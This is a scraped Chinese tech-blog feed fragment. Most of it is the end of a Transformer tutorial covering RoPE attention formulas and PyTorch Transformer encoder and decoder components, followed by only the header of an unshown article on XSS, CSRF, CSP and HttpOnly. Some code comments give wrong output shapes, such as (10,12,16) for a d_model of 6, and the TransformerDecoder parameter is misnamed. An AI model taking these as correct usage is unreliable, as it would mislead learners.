style="height:3em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span><span class="arraycolsep" style="width:0.5em;"/><span class="arraycolsep" style="width:0.5em;"/><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span/></span></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>Q</mi><mo stretchy="false">)</mo><mspace linebreak="newline"/><mi>K</mi><mo>=</mo><mi>R</mi><mi>o</mi><mi>P</mi><mi>E</mi><mo stretchy="false">(</mo><mi>K</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Q = RoPE(Q)\\
K = RoPE(K)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mclose">)</span></span><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.05764em;">PE</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mclose">)</span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mo>=</mo><mfrac><mrow><mi>Q</mi><mo>⋅</mo><msup><mi>K</mi><mi>T</mi></msup></mrow><msqrt><mi>k</mi></msqrt></mfrac><mtext>   </mtext><mo stretchy="false">(</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P = \frac{Q \cdot K^T }{\sqrt{k}}\space\space\space (seq\_len,seq\_len)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:2.4483em;vertical-align:-0.93em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.5183em;"><span style="top:-2.1778em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"/><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span><span style="top:-2.8922em;"><span class="pstrut" style="height:3em;"/><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewbox="0 0 400000 1080" preserveaspectratio="xMinYMin slice"><path d="M95,702&#10;c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14&#10;c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54&#10;c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10&#10;s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429&#10;c69,-144,104.5,-217.7,106.5,-221&#10;l0 -0&#10;c5.3,-9.3,12,-14,20,-14&#10;H400000v40H845.2724&#10;s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7&#10;c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z&#10;M834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1078em;"><span/></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"/><span class="mord"><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mopen">(</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></div>
<p>如果你想对RoPE有更加深层次的理解，非常推荐观看<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1CQoaY2EU2%2F" target="_blank" title="https://www.bilibili.com/video/BV1CQoaY2EU2/" ref="nofollow noopener noreferrer">作者武辰</a>的视频讲解</p>
<p>不要看到RoPE这么复杂就感到害怕，你只需把握一个核心本质：<strong>它们本质上都是对原始注意力分数矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">QK^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0358em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span> 进行修正。</strong> 无论具体操作是加一个偏置项，还是对查询和键进行旋转，其根本目的都是变着法子让模型建立起“距离”与“关注度”之间的关系：让相距较远的词对（对应的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mi>k</mi></mrow><annotation encoding="application/x-tex">qk</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span></span> 注意力分数）受到抑制，让相距较近的词对得到增强。</p>
<p>可以用下面这个图来简单的理解，距离越远的词，其注意力权重就会乘以一个越小系数</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ecf8b23bae1046569b9fd217742a106f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=cYTKzX9CdeyeBiG8d3NWJ5Bfo%2F8%3D" alt="c19.jpg" width="90%" loading="lazy"/></p>
<p>只要你理解了这个本质，未来你也可以设计一个新的位置编码算法。</p>
<h3 data-id="heading-2">附录2：Pytorch中的Transformer组件</h3>
<blockquote>
<p>如何用Pytorch快速搭建Transformer中的组件？其实Pytorch中有现成的Transformer组件函数，都打包好了，可以直接调用，下面就一一讲解，若想更加深入的理解学习，推荐自行查阅<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.pytorch.org%2Fdocs%2Fstable%2Fgenerated%2Ftorch.nn.TransformerEncoderLayer.html" target="_blank" title="https://docs.pytorch.org/docs/stable/generated/torch.nn.TransformerEncoderLayer.html" ref="nofollow noopener noreferrer">官方手册</a></p>
</blockquote>
<p><strong>a2.1 TransformerEncoderLayer</strong></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/51d3d730aa5b447391c682b9dc94a6ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=9kF02SJHbNkw%2FJxbVae59qxLv10%3D" alt="a1.jpg" width="70%" loading="lazy"/></p>
<p><strong>初始化参数：</strong></p>
<ul>
<li><code>d_model</code>: 输入序列的特征数量</li>
<li><code>nhead</code>: 多头注意力的头数量</li>
<li><code>dim_feedforward</code>: 前向传播隐藏层数量,默认值为2048</li>
<li><code>batch_first</code>: 输入输出维度顺序，默认False，但一般情况下强制其为True</li>
<li><code>dropout</code>: 默认为0.1</li>
<li><code>activation</code>: 激活函数，默认为<code>relu</code>,还可以使用<code>gelu</code>（gelu对序列任务表现较好，但是计算量大）</li>
</ul>
<p><strong>输入矩阵形状：</strong><code> (batch_size, seq_len, d_model)</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 使用示例</span>
encoder_layer = nn.TransformerEncoderLayer(d_model=<span class="hljs-number">6</span>, nhead=<span class="hljs-number">6</span>,batch_first=<span class="hljs-literal">True</span>,activation=<span class="hljs-string">"gelu"</span>)
inputs = torch.rand(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>, <span class="hljs-number">6</span>)
output = encoder_layer(inputs)
output.shape	<span class="hljs-comment"># 输出(1,10,6)</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 添加掩码</span>
seq_len = <span class="hljs-number">10</span>  <span class="hljs-comment"># 序列长度</span>
<span class="hljs-comment"># 创建上三角掩码 (对角线以上为True)</span>
src_mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()
output = encoder_layer(inputs, src_mask=src_mask)
output.shape	<span class="hljs-comment"># 输出(1,10,6)</span>
</code></pre>
<p>注意：Transformer编码器(Encoder)通常不需要上三角掩码，因为编码器应该能够看到整个输入序列。上三角掩码(因果掩码)通常是用于解码器(Decoder)中，防止模型在预测时看到未来的信息</p>
<p><strong>a2.2 TransformerEncoder</strong></p>
<p>多个TransformerEncoderLayer堆叠结构</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/928ff01c73a349709830f5cf1fb28f52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=tZ85%2FBLoWN9CSlMU1BsNk%2F1ac%2F8%3D" alt="a2.jpg" loading="lazy"/></p>
<p><strong>初始化参数：</strong></p>
<ul>
<li>
<p><code>encoder_layer</code>: 一个TransformerEncoderLayer层实例</p>
</li>
<li>
<p><code>num_layers</code>: 几个TransformerEncoderLayer层堆叠</p>
</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 使用示例</span>
encoder_layer = nn.TransformerEncoderLayer(
    d_model=<span class="hljs-number">6</span>, nhead=<span class="hljs-number">6</span>, batch_first=<span class="hljs-literal">True</span>, activation=<span class="hljs-string">"gelu"</span>
)	<span class="hljs-comment"># 先初始化一个TransformerEncoderLayer实例</span>
transformer_encoder = nn.TransformerEncoder(encoder_layer, num_layers=<span class="hljs-number">4</span>)    <span class="hljs-comment"># 4层堆叠</span>
inputs = torch.rand(<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">6</span>)
outputs = transformer_encoder(inputs)
outputs.shape	<span class="hljs-comment"># 输出(10,12,16)</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 添加掩码，注意，一般在编码器中不加掩码</span>
seq_len = <span class="hljs-number">12</span>  <span class="hljs-comment"># 序列长度</span>
mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()
output = transformer_encoder(inputs, mask=mask)
output.shape	<span class="hljs-comment"># 输出(10,12,16)</span>
</code></pre>
<p><strong>a2.3 TransformerDecoderLayer</strong></p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15ebbc8621ab451eb8749e1d866e289a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=nHlfIlCKvEZU5fSqPcMssTi9TaY%3D" alt="a3.jpg" loading="lazy"/></p>
<p><strong>初始化参数：</strong></p>
<ul>
<li><code>d_model</code>: 输入序列的特征数量</li>
<li><code>nhead</code>: 多头注意力的头数量</li>
<li><code>dim_feedforward</code>: 前向传播隐藏层数量,默认值为2048</li>
<li><code>batch_first</code>: 输入输出维度顺序，默认False，但一般情况下强制其为True</li>
<li><code>dropout</code>: 默认为0.1</li>
<li><code>activation</code>: 激活函数，默认为<code>relu</code>,还可以使用<code>gelu</code>（gelu对序列任务表现较好，但是计算量大）</li>
</ul>
<p><strong>输入矩阵形状：</strong> <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi><mo>=</mo><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><msub><mi>n</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>d</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi>b</mi><mi>a</mi><mi>t</mi><mi>c</mi><mi>h</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi><mo separator="true">,</mo><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><msub><mi>n</mi><mn>2</mn></msub><mo separator="true">,</mo><mi>d</mi><mi mathvariant="normal">_</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mi>l</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">X = (batch\_ size, seq\_ len_{1}, d\_ model),Y_{out} = (batch\_ size, seq\_len_{2}, d\_ model)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.06em;vertical-align:-0.31em;"/><span class="mopen">(</span><span class="mord mathnormal">ba</span><span class="mord mathnormal">t</span><span class="mord mathnormal">c</span><span class="mord mathnormal">h</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mclose">)</span></span></span></span></span></p>
<pre><code class="hljs language-python" lang="python">decoder_layer = nn.TransformerDecoderLayer(d_model=<span class="hljs-number">12</span>, nhead=<span class="hljs-number">4</span>,batch_first=<span class="hljs-literal">True</span>)
Y_out = torch.rand(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>, <span class="hljs-number">12</span>)
X = torch.rand(<span class="hljs-number">2</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>)   <span class="hljs-comment"># 注意两个序列长度可以不一样</span>
seq_len = <span class="hljs-number">20</span>
mask = torch.triu(torch.ones(seq_len, seq_len), diagonal=<span class="hljs-number">1</span>).<span class="hljs-built_in">bool</span>()  <span class="hljs-comment"># 加掩码，当然也可以不加，主要看你的任务是什么</span>
output = decoder_layer(X, Y_out,tgt_mask=mask)
output.shape	<span class="hljs-comment"># 输出(2,20,12)</span>
</code></pre>
<p><strong>a2.4 TransformerDecoder</strong></p>
<p>多个TransformerDecoderLayer堆叠结构</p>
<p><strong>初始化参数：</strong></p>
<ul>
<li>
<p><code>encoder_layer</code>: 一个TransformerDecoderLayer层实例</p>
</li>
<li>
<p><code>num_layers</code>: 几个TransformerDecoderLayer层堆叠</p>
</li>
</ul>
<p>使用方法和TransformerEncoder同理，不在此过多介绍</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[XSS、CSRF、CSP、HttpOnly 全扫盲：前端安全不只是后端的事]]></title>    <link>https://juejin.cn/post/7583615094363193398</link>    <guid>https://juejin.cn/post/7583615094363193398</guid>    <pubDate>2025-12-15T08:13:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583615094363193398" data-draft-id="7583845695196790838" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="XSS、CSRF、CSP、HttpOnly 全扫盲：前端安全不只是后端的事"/> <meta itemprop="keywords" content="前端,后端,面试"/> <meta itemprop="datePublished" content="2025-12-15T08:13:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="也无风雨也雾晴"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            XSS、CSRF、CSP、HttpOnly 全扫盲：前端安全不只是后端的事
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    也无风雨也雾晴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T08:13:58.000Z" title="Mon Dec 15 2025 08:13:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body 